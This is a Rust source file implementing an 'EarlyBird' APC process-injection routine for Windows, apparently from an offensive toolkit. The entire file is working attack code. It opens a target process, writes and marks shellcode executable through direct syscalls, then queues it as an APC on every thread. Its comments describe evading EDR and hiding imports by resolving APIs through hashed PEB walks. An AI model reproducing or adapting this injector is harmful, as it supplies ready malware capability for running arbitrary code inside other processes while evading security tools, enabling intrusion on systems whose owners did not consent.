use crate::injection::{payload_has_valid_pe_headers, Injector};
use anyhow::{anyhow, Result};

pub struct EarlyBirdInjector;

/// APC-based injection primitive for EarlyBird.
///
/// Opens the target process, allocates + writes + protects shellcode, then
/// queues a user-mode APC via `NtQueueApcThread` to every thread in the
/// target process.  When any thread enters an alertable wait (SleepEx,
/// WaitForSingleObjectEx, etc.) the APC fires and executes the shellcode.
///
/// Unlike `NtCreateThreadEx`, this never creates a new remote thread — the
/// payload runs on an existing thread via the APC mechanism, which is
/// quieter from an EDR perspective.
#[cfg(windows)]
impl Injector for EarlyBirdInjector {
    fn inject(&self, pid: u32, payload: &[u8]) -> Result<()> {
        // Early-bird APC path stages shellcode. PE payloads must use
        // Hollowing/ManualMap-style loaders instead.
        if payload_has_valid_pe_headers(payload) {
            return Err(anyhow!(
                "EarlyBird injection requires raw shellcode, not a PE image. \
                 Use InjectionMethod::Hollowing or InjectionMethod::ModuleStomp for PE payloads."
            ));
        }

        use crate::win_types::PAGE_READWRITE;
        use windows_sys::Win32::System::Diagnostics::ToolHelp::TH32CS_SNAPTHREAD;
        use windows_sys::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ};
        use windows_sys::Win32::System::Threading::{
            PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_WRITE, THREAD_SET_CONTEXT,
        };

        let access_mask = PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION;

        unsafe {
            // ── Step 1: Open target process ─────────────────────────────
            let mut client_id = [0u64; 2];
            client_id[0] = pid as u64;
            let mut obj_attr: crate::win_types::OBJECT_ATTRIBUTES = std::mem::zeroed();
            obj_attr.Length = std::mem::size_of::<crate::win_types::OBJECT_ATTRIBUTES>() as u32;

            let mut h_proc: usize = 0;
            let open_status = crate::syscall!(
                "NtOpenProcess",
                &mut h_proc as *mut _ as u64,
                access_mask as u64,
                &mut obj_attr as *mut _ as u64,
                client_id.as_mut_ptr() as u64,
            );
            match open_status {
                Ok(s) if s >= 0 && h_proc != 0 => {}
                _ => return Err(anyhow!("EarlyBird: NtOpenProcess({pid}) failed")),
            }
            let h_proc = h_proc as *mut std::ffi::c_void;

            macro_rules! close_h {
                ($h:expr) => {
                    crate::syscall!("NtClose", $h as u64).ok();
                };
            }
            macro_rules! cleanup_and_err {
                ($msg:expr) => {{
                    close_h!(h_proc);
                    return Err(anyhow!($msg));
                }};
                ($fmt:expr, $($arg:tt)*) => {{
                    close_h!(h_proc);
                    return Err(anyhow!($fmt, $($arg)*));
                }};
            }

            // ── Step 2: Allocate RW memory ──────────────────────────────
            let mut remote_mem: *mut std::ffi::c_void = std::ptr::null_mut();
            let mut alloc_size = payload.len();
            let s = crate::syscall!(
                "NtAllocateVirtualMemory",
                h_proc as u64,
                &mut remote_mem as *mut _ as u64,
                0u64,
                &mut alloc_size as *mut _ as u64,
                (MEM_COMMIT | MEM_RESERVE) as u64,
                PAGE_READWRITE as u64,
            );
            match s {
                Ok(st) if st >= 0 => {}
                _ => cleanup_and_err!("EarlyBird: NtAllocateVirtualMemory failed"),
            }
            if remote_mem.is_null() {
                cleanup_and_err!("EarlyBird: NtAllocateVirtualMemory returned null");
            }

            // ── Step 3: Write shellcode ─────────────────────────────────
            let mut written = 0usize;
            let s = crate::syscall!(
                "NtWriteVirtualMemory",
                h_proc as u64,
                remote_mem as u64,
                payload.as_ptr() as u64,
                payload.len() as u64,
                &mut written as *mut _ as u64,
            );
            match s {
                Ok(st) if st >= 0 => {}
                _ => cleanup_and_err!("EarlyBird: NtWriteVirtualMemory failed"),
            }
            if written != payload.len() {
                cleanup_and_err!(
                    "EarlyBird: NtWriteVirtualMemory wrote {} of {} bytes",
                    written,
                    payload.len()
                );
            }

            // ── Step 4: Flip to RX ──────────────────────────────────────
            let mut old_prot = 0u32;
            let mut prot_base = remote_mem as usize;
            let mut prot_size = payload.len();
            let s = crate::syscall!(
                "NtProtectVirtualMemory",
                h_proc as u64,
                &mut prot_base as *mut _ as u64,
                &mut prot_size as *mut _ as u64,
                PAGE_EXECUTE_READ as u64,
                &mut old_prot as *mut _ as u64,
            );
            match s {
                Ok(st) if st >= 0 => {}
                _ => cleanup_and_err!("EarlyBird: NtProtectVirtualMemory to RX failed"),
            }

            // ── Step 5: Flush I-cache ───────────────────────────────────
            crate::syscall!(
                "NtFlushInstructionCache",
                h_proc as u64,
                remote_mem as u64,
                payload.len() as u64,
            )
            .ok();

            // ── Step 6: Queue APC to target process threads ─────────────
            //
            // Enumerate all threads in the target process and queue an APC
            // to each one via NtQueueApcThread.  The APC fires when the
            // thread enters an alertable wait state — this is the real
            // EarlyBird APC mechanism, as opposed to NtCreateThreadEx which
            // creates a brand-new thread (used by RemoteThread/NtCreateThread).
            //
            // We resolve CreateToolhelp32Snapshot / Thread32First / Thread32Next
            // via PEB walk to avoid touching kernel32.dll IAT.

            let ntdll_hash = pe_resolve::hash_str(b"ntdll.dll\0");
            let kernel32_hash = pe_resolve::hash_str(b"kernel32.dll\0");

            let ntdll = pe_resolve::get_module_handle_by_hash(ntdll_hash)
                .ok_or_else(|| anyhow!("EarlyBird: ntdll not found"))?;
            let kernel32 = pe_resolve::get_module_handle_by_hash(kernel32_hash)
                .ok_or_else(|| anyhow!("EarlyBird: kernel32 not found"))?;

            let snap_hash = pe_resolve::hash_str(b"CreateToolhelp32Snapshot\0");
            let t32f_hash = pe_resolve::hash_str(b"Thread32First\0");
            let t32n_hash = pe_resolve::hash_str(b"Thread32Next\0");
            let close_hash = pe_resolve::hash_str(b"CloseHandle\0");

            let snap_fn: unsafe extern "system" fn(u32, u32) -> *mut std::ffi::c_void =
                std::mem::transmute(
                    pe_resolve::get_proc_address_by_hash(kernel32, snap_hash)
                        .ok_or_else(|| anyhow!("EarlyBird: CreateToolhelp32Snapshot not found"))?,
                );

            type Thread32Fn = unsafe extern "system" fn(
                *mut std::ffi::c_void,
                *mut windows_sys::Win32::System::Diagnostics::ToolHelp::THREADENTRY32,
            ) -> i32;

            let t32f_fn: Thread32Fn = std::mem::transmute(
                pe_resolve::get_proc_address_by_hash(kernel32, t32f_hash)
                    .ok_or_else(|| anyhow!("EarlyBird: Thread32First not found"))?,
            );
            let t32n_fn: Thread32Fn = std::mem::transmute(
                pe_resolve::get_proc_address_by_hash(kernel32, t32n_hash)
                    .ok_or_else(|| anyhow!("EarlyBird: Thread32Next not found"))?,
            );
            let close_fn: unsafe extern "system" fn(*mut std::ffi::c_void) -> i32 =
                std::mem::transmute(
                    pe_resolve::get_proc_address_by_hash(kernel32, close_hash)
                        .ok_or_else(|| anyhow!("EarlyBird: CloseHandle not found"))?,
                );

            // TH32CS_SNAPTHREAD = 0x00000004
            let snap = snap_fn(TH32CS_SNAPTHREAD, 0);
            if snap.is_null() || snap as usize == usize::MAX || snap as usize == 0xFFFFFFFF {
                cleanup_and_err!("EarlyBird: CreateToolhelp32Snapshot failed");
            }

            const TE_SIZE: u32 = std::mem::size_of::<
                windows_sys::Win32::System::Diagnostics::ToolHelp::THREADENTRY32,
            >() as u32;
            let mut te = windows_sys::Win32::System::Diagnostics::ToolHelp::THREADENTRY32 {
                dwSize: TE_SIZE,
                ..unsafe { std::mem::zeroed() }
            };

            let mut queued = 0u32;
            let mut total_target_threads = 0u32;

            if t32f_fn(snap, &mut te) != 0 {
                loop {
                    if te.th32OwnerProcessID == pid {
                        total_target_threads += 1;

                        // Open the thread with THREAD_SET_CONTEXT (required for
                        // NtQueueApcThread — the "SET_CONTEXT" name is misleading;
                        // it actually grants APC queue access).
                        let mut h_thread: usize = 0;
                        let mut cid = [0u64; 2];
                        cid[1] = te.th32ThreadID as u64;
                        let mut oa: crate::win_types::OBJECT_ATTRIBUTES = std::mem::zeroed();
                        oa.Length =
                            std::mem::size_of::<crate::win_types::OBJECT_ATTRIBUTES>() as u32;

                        let thread_access = THREAD_SET_CONTEXT as u64;
                        let open_ok = crate::syscall!(
                            "NtOpenThread",
                            &mut h_thread as *mut _ as u64,
                            thread_access,
                            &mut oa as *mut _ as u64,
                            cid.as_mut_ptr() as u64,
                        );
                        if let Ok(s) = open_ok {
                            if s >= 0 && h_thread != 0 {
                                // NtQueueApcThread(hThread, ApcRoutine, ApcContext, ApcArgument1, ApcArgument2)
                                let apc_status = crate::syscall!(
                                    "NtQueueApcThread",
                                    h_thread as u64,
                                    remote_mem as u64, // ApcRoutine → shellcode entry
                                    0u64,              // ApcContext
                                    0u64,              // ApcArgument1
                                    0u64,              // ApcArgument2
                                );
                                crate::syscall!("NtClose", h_thread as u64).ok();
                                if let Ok(st) = apc_status {
                                    if st >= 0 {
                                        queued += 1;
                                    }
                                }
                            }
                        }
                    }

                    te.dwSize = TE_SIZE;
                    if t32n_fn(snap, &mut te) == 0 {
                        break;
                    }
                }
            }

            close_fn(snap);
            close_h!(h_proc);

            if total_target_threads == 0 {
                return Err(anyhow!(
                    "EarlyBird: no threads found in target process {pid}"
                ));
            }
            if queued == 0 {
                return Err(anyhow!(
                    "EarlyBird: failed to queue APC to any of the {total_target_threads} \
                     threads in process {pid} (THREAD_SET_CONTEXT denied or all NtQueueApcThread calls failed)"
                ));
            }

            tracing::debug!(
                "EarlyBird: queued APC to {queued}/{total_target_threads} threads in process {pid}"
            );
        }
        Ok(())
    }
}

#[cfg(not(windows))]
impl Injector for EarlyBirdInjector {
    fn inject(&self, _pid: u32, _payload: &[u8]) -> Result<()> {
        Err(anyhow!("EarlyBird injection only supported on Windows"))
    }
}
